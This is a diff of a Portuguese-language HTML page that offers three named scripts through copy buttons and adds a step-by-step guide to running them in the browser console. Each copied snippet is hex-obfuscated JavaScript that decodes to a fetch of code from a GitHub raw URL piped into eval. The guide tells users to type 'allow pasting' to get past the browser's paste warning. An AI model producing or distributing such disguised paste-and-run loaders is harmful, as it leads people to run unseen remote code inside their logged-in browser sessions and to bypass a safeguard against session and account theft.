@@ -2,29 +2,91 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Scripts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Script Loader Hub</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .card {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .card span { font-weight: bold; font-family: monospace; }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #0056b3; }
+        .tutorial {
+            background: #fff3cd;
+            border-left: 5px solid #ffeeba;
+            padding: 15px;
+            margin-top: 30px;
+            border-radius: 4px;
+        }
+        code { background: #eee; padding: 2px 5px; border-radius: 3px; font-family: monospace; }
+        h2 { border-bottom: 2px solid #333; padding-bottom: 5px; }
+    </style>
 </head>
 <body>
 
-    <p>
-        funnywave 
+    <h2>Scripts Disponíveis</h2>
+
+    <div class="card">
+        <span>funnywave</span>
         <button onclick="copy('[][\'fill\'][\'constructor\'](\'666574636828272f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6a6174726f706861787a2f2d2f6d61696e2f66756e6e797761766527292e7468656e28723d3e722e746578742829292e7468656e286576616c29\'.replace(/../g,h=>String.fromCharCode(parseInt(h,16))))()')">copiar</button>
-    </p>
+    </div>
 
-    <p>
-        flappiden 
+    <div class="card">
+        <span>flappiden</span>
         <button onclick="copy('[][\'fill\'][\'constructor\'](\'666574636828272f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6a6174726f706861787a2f2d2f6d61696e2f666c6170706964656e27292e7468656e28723d3e722e746578742829292e7468656e286576616c29\'.replace(/../g,h=>String.fromCharCode(parseInt(h,16))))()')">copiar</button>
-    </p>
+    </div>
 
-    <p>
-        ricinusWriter 
+    <div class="card">
+        <span>ricinusWriter</span>
         <button onclick="copy('[][\'fill\'][\'constructor\'](\'6665746368282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f726963696e7573732f492f6d61696e2f726963696e75737772697465722e6a7327292e7468656e28723d3e722e746578742829292e7468656e286576616c29\'.replace(/../g,h=>String.fromCharCode(parseInt(h,16))))()')">copiar</button>
-    </p>
+    </div>
+
+    <div class="tutorial">
+        <h3>Como executar os scripts:</h3>
+        <ol>
+            <li>Clique no botão <strong>copiar</strong> do script desejado.</li>
+            <li>Abra o console do seu navegador:
+                <ul>
+                    <li>No <strong>Chrome/Edge/Brave</strong>: <code>Ctrl + Shift + J</code></li>
+                    <li>No <strong>Firefox</strong>: <code>Ctrl + Shift + K</code></li>
+                </ul>
+            </li>
+            <li>Se for sua primeira vez, o navegador pode bloquear a colagem. Se aparecer um aviso, digite exatamente: <br> <code>allow pasting</code> e aperte <strong>Enter</strong>.</li>
+            <li>Agora, cole o código (<code>Ctrl + V</code>) e aperte <strong>Enter</strong> para rodar.</li>
+        </ol>
+    </div>
 
     <script>
         function copy(text) {
-            navigator.clipboard.writeText(text);
-            alert("Copiado!");
+            navigator.clipboard.writeText(text).then(() => {
+                alert("Código copiado para a área de transferência!");
+            }).catch(err => {
+                console.error('Erro ao copiar: ', err);
+            });
         }
     </script>
 
